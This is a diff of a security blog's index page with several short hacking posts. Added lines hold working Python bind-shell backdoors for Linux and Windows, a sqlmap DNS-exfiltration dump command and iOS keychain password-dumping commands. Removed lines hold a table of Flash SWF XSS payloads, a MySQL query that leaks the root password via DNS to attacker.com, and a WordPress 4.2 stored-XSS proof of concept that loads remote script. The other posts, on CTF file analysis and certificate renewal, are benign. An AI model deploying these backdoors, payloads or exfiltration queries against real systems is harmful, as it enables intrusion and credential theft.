+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg 1.mp4</span><br></pre></td></tr></table></figure>
+<h3 id="pngcheck"><a href="#pngcheck" class="headerlink" title="pngcheck"></a>pngcheck</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; pngcheck -vv 1.png</span><br></pre></td></tr></table></figure>
+<h3 id="zlib"><a href="#zlib" class="headerlink" title="zlib"></a>zlib</h3><blockquote>
+<p>python来写zlib解压,zlib开头是以78 9C开头</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/env python</span><br><span class="line">import zlib</span><br><span class="line">import binascii</span><br><span class="line">IDAT = &quot;789C5D91011280400802BF04FFFF5C75294B5537738A21A27D1E49CFD17DB3937A92E7E603880A6D485100901FB0410153350DE83112EA2D51C54CE2E585B15A2FC78E8872F51C6FC1881882F93D372DEF78E665B0C36C529622A0A45588138833A170A2071DDCD18219DB8C0D465D8B6989719645ED9C11C36AE3ABDAEFCFC0ACF023E77C17C7897667&quot;.decode(&apos;hex&apos;)</span><br><span class="line">#print IDAT</span><br><span class="line">result = binascii.hexlify(zlib.decompress(IDAT))</span><br><span class="line">print result</span><br><span class="line"> </span><br><span class="line">#print result.decode(&apos;hex&apos;)</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/08/24/Backdoor-Tips/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="xl7dev">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="xl7dev">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/08/24/Backdoor-Tips/" itemprop="url">
+                  Backdoor Tips
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-08-24T14:46:29+08:00">
+                2016-08-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="正向backdoor"><a href="#正向backdoor" class="headerlink" title="正向backdoor"></a>正向backdoor</h3><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><blockquote>
+<p>backdoor.py</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from socket import *</span><br><span class="line">import subprocess</span><br><span class="line">import os, threading, sys, time</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    server=socket(AF_INET,SOCK_STREAM)</span><br><span class="line">    server.bind((&apos;0.0.0.0&apos;,11))</span><br><span class="line">    server.listen(5)</span><br><span class="line">    print &apos;waiting for connect&apos;</span><br><span class="line">    talk, addr = server.accept()</span><br><span class="line">    print &apos;connect from&apos;,addr</span><br><span class="line">    proc = subprocess.Popen([&quot;/bin/sh&quot;,&quot;-i&quot;],stdin=talk,stdout=talk,stderr=talk, shell=True)</span><br></pre></td></tr></table></figure>
+<h4 id="Window"><a href="#Window" class="headerlink" title="Window"></a>Window</h4><blockquote>
+<p>backdoor.py</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from socket import *</span><br><span class="line">import subprocess</span><br><span class="line">import os, threading</span><br><span class="line"></span><br><span class="line">def send(talk, proc):</span><br><span class="line">    import time</span><br><span class="line">    while True:</span><br><span class="line">        msg = proc.stdout.readline()</span><br><span class="line">        talk.send(msg)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    server=socket(AF_INET,SOCK_STREAM)</span><br><span class="line">    server.bind((&apos;0.0.0.0&apos;,11))</span><br><span class="line">    server.listen(5)</span><br><span class="line">    print &apos;waiting for connect&apos;</span><br><span class="line">    talk, addr = server.accept()</span><br><span class="line">    print &apos;connect from&apos;,addr</span><br><span class="line">    proc = subprocess.Popen(&apos;cmd.exe /K&apos;,stdin=subprocess.PIPE,stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)</span><br><span class="line">    t = threading.Thread(target = send, args = (talk, proc))</span><br><span class="line">    t.setDaemon(True)</span><br><span class="line">    t.start()</span><br><span class="line">    while True:</span><br><span class="line">        cmd=talk.recv(1024)</span><br><span class="line">        proc.stdin.write(cmd)</span><br><span class="line">        proc.stdin.flush()</span><br><span class="line">    server.close()</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/08/23/Bypass-header-function/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="xl7dev">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="xl7dev">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/08/23/Bypass-header-function/" itemprop="url">
+                  Bypass header function
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-08-23T12:29:06+08:00">
+                2016-08-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="0x01-Code"><a href="#0x01-Code" class="headerlink" title="0x01 Code"></a>0x01 Code</h3><blockquote>
+<p><a href="http://www.bypassheader.com/index.php" target="_blank" rel="external">http://www.bypassheader.com/index.php</a></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    session_start();</span><br><span class="line">    if($_SESSION(&apos;bypass&apos;))&#123;</span><br><span class="line">        echo &apos;ok&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        header(&apos;Location: http://www.baidu.com/&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;bypass header&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-firefox-NoRedirect-plugins"><a href="#0x02-firefox-NoRedirect-plugins" class="headerlink" title="0x02 firefox NoRedirect plugins"></a>0x02 firefox NoRedirect plugins</h3><p>Install <a href="https://addons.mozilla.org/zh-CN/firefox/addon/noredirect/" target="_blank" rel="external">NoRedirect</a> plugins</p>
+<blockquote>
+<p>usage</p>
+</blockquote>
+<table>
 <thead>
 <tr>
-<th>Vendor</th>
-<th>url</th>
+<th>regex</th>
+<th>referer</th>
+<th>allow</th>
+<th>DNS Error</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td>Zeroclipboard</td>
-<td>/zeroclipboard.swf?id=\”))}catch(e){alert(1);}//&amp;width=500&amp;height=500&amp;.swf</td>
-</tr>
-<tr>
-<td>JW Player</td>
-<td>/player.swf?playerready=alert(document.cookie)</td>
-</tr>
-<tr>
-<td>JW Player</td>
-<td>/player.swf?tracecall=alert(document.cookie)</td>
-</tr>
-<tr>
-<td>Custom</td>
-<td>/banner.swf?clickTAG=javascript:alert(1);//</td>
-</tr>
-<tr>
-<td>SwfUpload v2.2.0.1</td>
-<td>/swfupload.swf?movieName=”]);}catch(e){}if(!self.a)self.a=!alert(1);//</td>
-</tr>
-<tr>
-<td>YUI2</td>
-<td>/io.swf?yid=\”));}catch(e){alert(1);}//</td>
-</tr>
-<tr>
-<td>Jplayer</td>
-<td>/Jplayer.swf?jQuery=confirm&amp;id=Your information.’)*confirm(document.cookie%2b’&amp;vol=0.8&amp;muted=false&amp;.swf</td>
-</tr>
-<tr>
-<td>player</td>
-<td>/player.swf?playerID=a\%22%29%29}catch%28e%29{alert%28document.domain%29}//</td>
-</tr>
-<tr>
-<td>uploader</td>
-<td>/uploader.swf?allowedDomain=\%22}%29%29%29}catch%28e%29{alert%28document.domain%29;}//</td>
-</tr>
-<tr>
-<td>tagcloud</td>
-<td>/tagcloud.swf?mode=tags&amp;tagcloud=%3Ctags%3E%3Ca+href=’<a href="http://websecurity.com.ua&#39;+style=&#39;font-size:+40pt&#39;%3EClick%20me%3C/a%3E%3C/tags%3E" target="_blank" rel="external">http://websecurity.com.ua&#39;+style=&#39;font-size:+40pt&#39;%3EClick%20me%3C/a%3E%3C/tags%3E</a></td>
-</tr>
-<tr>
-<td>open-flash-chart</td>
-<td>/open-flash-chart.swf?get-data=(function(){alert(/hello/)})()</td>
-</tr>
-<tr>
-<td>io</td>
-<td>/io.swf?yid=\”));}catch(e){alert(9)}//</td>
-</tr>
-<tr>
-<td>uploadify</td>
-<td>/uploadify.swf?buttonText=%3Ca%20href=%27javascript:alert%289%29%27鈥�%3ETest%3C/a%3E</td>
-</tr>
-<tr>
-<td>downloadify</td>
-<td>/downloadify.swf?queue_name=%22))}catch(e){}if(!self.a)self.a=!alert(‘XSS’);//&amp;width&amp;height&amp;downloadImage=<a href="http://www.google.co.in/images/srpr/logo4w.png" target="_blank" rel="external">http://www.google.co.in/images/srpr/logo4w.png</a></td>
-</tr>
-<tr>
-<td>flvPlayer</td>
-<td>/flvPlayer.swf?flvToPlay=xss.xml</td>
-</tr>
-<tr>
-<td>aflax</td>
-<td>/aflax.swf?callback=alert(9)</td>
-</tr>
-<tr>
-<td>redirect</td>
-<td>/redirect.swf?url=javascript:alert(9);</td>
-</tr>
-<tr>
-<td>finnor</td>
-<td>/finnor.swf?clickTag=javascript:alert(1);</td>
-</tr>
-<tr>
-<td>Vulnerable</td>
-<td>/vulnerable.swf?htmlVar=%3Ca%20href%3D%22asfunction%3AgetURL%2Cjavascript%3Aalert%28%27gotcha%21%27%29%22%3E%20Click%20here%3C%2fa%3E</td>
-</tr>
-<tr>
-<td>Pie3D</td>
-<td>/Pie3D.swf?dataURL=xss.xml</td>
-</tr>
-<tr>
-<td>link_protocol_test [only firefox]</td>
-<td>/link_protocol_test.swf?input=data%3Atext%2fhtml%3Btext%2C%3Cscript%3Ealert%28document.domain%29%3B%3C%2fscript%3E%2f%2f</td>
-</tr>
-<tr>
-<td>flashmediaelement &lt; v2.21.1</td>
-<td>/flashmediaelement.swf?jsinitfunctio%gn=alert<code>1</code></td>
+<td>^<a href="http://www\.bypassheader\.com" target="_blank" rel="external">http://www\.bypassheader\.com</a></td>
+<td>√</td>
+<td></td>
+<td></td>
 </tr>
 </tbody>
 </table>
@@ -1295,7 +1308,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/06/14/DNS-exfiltration-with-SQL-Injection/">
+  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/08/09/SQLMAP-Dns-Injection/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="name" content="xl7dev">
@@ -1320,8 +1333,8 @@
             
               
                 
-                <a class="post-title-link" href="/2016/06/14/DNS-exfiltration-with-SQL-Injection/" itemprop="url">
-                  DNS exfiltration with SQL Injection
+                <a class="post-title-link" href="/2016/08/09/SQLMAP-Dns-Injection/" itemprop="url">
+                  SQLMAP Dns Injection
                 </a>
               
             
@@ -1335,8 +1348,8 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-06-14T02:58:57+08:00">
-                2016-06-14
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-08-09T13:42:50+08:00">
+                2016-08-09
               </time>
             
 
@@ -1372,257 +1385,163 @@
 
       
         
-          <h4 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOAD_FILE(&apos;&lt;filepath&gt;&apos;)   # reads the file content and returns it as a string</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>example</p>
+          
+            <p>0x01 Environment<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wampserver  ==&gt; Virtual host-&gt;waf.com</span><br><span class="line">sqlmap      ==&gt; sqlmap on win2003</span><br><span class="line">win2003     ==&gt; dns -&gt; 127.0.0.1</span><br></pre></td></tr></table></figure></p>
+<p>0x02 Hack fun it<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; sqlmap.py -u &quot;http://www.example.com/index.php?id=1&quot; --dns-domain=&quot;waf.com&quot; -D &quot;dvwa&quot; -T &quot;users&quot; --dump</span><br></pre></td></tr></table></figure></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/07/18/Pentesting-ios-apps/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="xl7dev">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="xl7dev">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/07/18/Pentesting-ios-apps/" itemprop="url">
+                  Pentesting ios apps
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-07-18T21:46:39+08:00">
+                2016-07-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">openssh</span><br><span class="line">gdb</span><br><span class="line">top</span><br><span class="line">file</span><br><span class="line">gawk</span><br><span class="line">find</span><br><span class="line">gzip</span><br><span class="line">lsof</span><br><span class="line">Netword Commands</span><br><span class="line">pstree</span><br><span class="line">readline</span><br><span class="line">rsync</span><br><span class="line">sed</span><br><span class="line">syslog</span><br><span class="line">vim</span><br><span class="line">hexdump</span><br><span class="line">strings</span><br><span class="line">otool</span><br><span class="line">plutil</span><br><span class="line">FileDP</span><br><span class="line">dumpdecrypted</span><br><span class="line">class-dump</span><br><span class="line">class-dump-z</span><br><span class="line">Keychain-Dumper</span><br><span class="line">cycript</span><br><span class="line">BurpSuite</span><br><span class="line">sslstrip</span><br><span class="line">Introspy-Analyzer</span><br><span class="line">ios-ssl-kill-switch</span><br><span class="line">iFunbox</span><br><span class="line">reveal</span><br><span class="line">Clutch</span><br><span class="line">iRET</span><br><span class="line">idb</span><br></pre></td></tr></table></figure>
+<h3 id="plutil"><a href="#plutil" class="headerlink" title="plutil"></a>plutil</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; plutil -convert xml1 com.example.plist</span><br></pre></td></tr></table></figure>
+<h3 id="FileDP"><a href="#FileDP" class="headerlink" title="FileDP"></a>FileDP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; chmod 777 FileDP</span><br><span class="line">&gt; ./FileDP -d /var/mobile/Applications/&lt;UUID&gt;/Library/Preferences/</span><br><span class="line">&gt; ./FileDP -f /var/mobile/Applications/&lt;UUID&gt;/Library/Preferences/xxx.plist</span><br></pre></td></tr></table></figure>
+<h3 id="class-dump"><a href="#class-dump" class="headerlink" title="class-dump"></a><a href="https://github.com/nygard/class-dump/releases" target="_blank" rel="external">class-dump</a></h3><h3 id="class-dump-z"><a href="#class-dump-z" class="headerlink" title="class-dump-z"></a><a href="http://networkpx.googlecode.com/files/class-dump-z_0.2a.tar.gz" target="_blank" rel="external">class-dump-z</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; class-dump-z -H -I appname -o /path/appname.h</span><br></pre></td></tr></table></figure>
+<h3 id="cycript"><a href="#cycript" class="headerlink" title="cycript"></a><a href="http://www.cycript.org/debs/" target="_blank" rel="external">cycript</a></h3><h3 id="Keychain-Dumper"><a href="#Keychain-Dumper" class="headerlink" title="Keychain-Dumper"></a><a href="https://github.com/ptoomey3/Keychain-Dumper" target="_blank" rel="external">Keychain-Dumper</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; keychain-dumper -e &gt; /var/tmp/entitlements.xml</span><br><span class="line">&gt; keychain-dumper -a &gt; /var/tmp/password.txt</span><br></pre></td></tr></table></figure>
+<h3 id="dumpdecrypted"><a href="#dumpdecrypted" class="headerlink" title="dumpdecrypted"></a><a href="http://git.oschina.net/hongyangyi/dumpdecrypted" target="_blank" rel="external">dumpdecrypted</a></h3><blockquote>
+<p>dumpdecrypted 6/7/8</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(&apos;\\\\&apos;,(SELECT password FROM mysql.user WHERE user=&apos;root&apos; LIMIT 1),&apos;.attacker.com\\foobar&apos;));</span><br></pre></td></tr></table></figure>
-          <!--noindex-->
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2016/06/14/DNS-exfiltration-with-SQL-Injection/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/06/13/WordPress-4-2-Stored-XSS-Getshell-via-XSS-Platform/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="xl7dev">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="xl7dev">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/06/13/WordPress-4-2-Stored-XSS-Getshell-via-XSS-Platform/" itemprop="url">
-                  WordPress 4.2 Stored XSS Getshell via XSS Platform
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-06-13T00:56:15+08:00">
-                2016-06-13
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h4 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h4><p>WordPress 4.2 Stored XSS<br>受影响范围：WordPress 4.2, 4.1.2, 4.1.1, 3.9.3<br>匿名评论后管理员前台触发，覆盖率全屏窗口</p>
-<h4 id="POC："><a href="#POC：" class="headerlink" title="POC："></a>POC：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a title=&apos;x onmouseover=eval(unescape(/with%28document%290%5Bbody.appendChild%28createElement%28%27script%27%29%29.src%3D%27http%3A%2f%2ft.cn%2fR5ivC0L%27%5D/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px AAAA...[64kb]..AAAAA&apos;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>
-          <!--noindex-->
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2016/06/13/WordPress-4-2-Stored-XSS-Getshell-via-XSS-Platform/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/06/01/Automatic-deployment-Let-s-Encrypt-Certificate/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="xl7dev">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="xl7dev">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/06/01/Automatic-deployment-Let-s-Encrypt-Certificate/" itemprop="url">
-                  Automatic deployment Let's Encrypt Certificate
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-06-01T16:16:52+08:00">
-                2016-06-01
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="Install-in-Ubuntu14"><a href="#Install-in-Ubuntu14" class="headerlink" title="Install in Ubuntu14"></a>Install in Ubuntu14</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt; sudo apt-get update</span><br><span class="line">&gt; sudo apt-get install git</span><br><span class="line">&gt; sudo easy_install --upgrade pip</span><br><span class="line">&gt; sudo apt-get install python-dev</span><br><span class="line">&gt; sudo apt-get install dialog</span><br><span class="line">&gt; sudo pip install libffi-dev</span><br><span class="line">&gt; sudo pip install cryptography</span><br><span class="line">&gt; sudo pip install zope.component</span><br><span class="line">&gt; sudo pip install pyrfc3339</span><br><span class="line">&gt; sudo pip install werkzeug</span><br><span class="line">&gt; sudo pip install --upgrade requests</span><br><span class="line">&gt; sudo pip install letsencrypt</span><br><span class="line">&gt; sudo pip install letsencrypt-nginx</span><br><span class="line">&gt; sudo apt-get install letsencrypt</span><br><span class="line">&gt; sudo git clone https://github.com/letsencrypt/letsencrypt /opt/letsencrypt</span><br><span class="line">&gt; ./letsencrypt-auto --apache -d www.example.com</span><br></pre></td></tr></table></figure>
-<h3 id="Add-to-Crontab"><a href="#Add-to-Crontab" class="headerlink" title="Add to Crontab"></a>Add to Crontab</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; sudo crontab -e</span><br><span class="line">30 2 * * 1 /opt/letsencrypt/letsencrypt-auto renew &gt;&gt; /var/log/le-renew.log</span><br></pre></td></tr></table></figure>
